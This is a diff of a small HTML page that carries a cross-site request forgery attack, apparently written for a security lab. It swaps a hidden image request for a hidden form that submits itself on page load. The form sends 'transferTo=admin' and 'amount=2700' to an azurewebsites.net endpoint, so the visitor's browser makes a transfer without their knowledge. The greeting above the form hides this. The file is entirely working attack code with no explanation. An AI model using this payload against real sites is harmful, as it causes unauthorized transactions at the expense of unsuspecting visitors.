@@ -1,6 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <img src="https://ad0a2b04410b49bd8ad1f1e5c46e782e.azurewebsites.net/auth.html?transferTo=admin&amount=500" style="display:none">
+  <h1> Hello, thanks for visiting! </h1>
+    <form action="https://ad0a2b04410b49bd8ad1f1e5c46e782e.azurewebsites.net/auth.html" method="GET">
+      <input type="hidden" name="transferTo" value="admin">
+      <input type="hidden" name="amount" value="2700">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
   </body>
 </html>
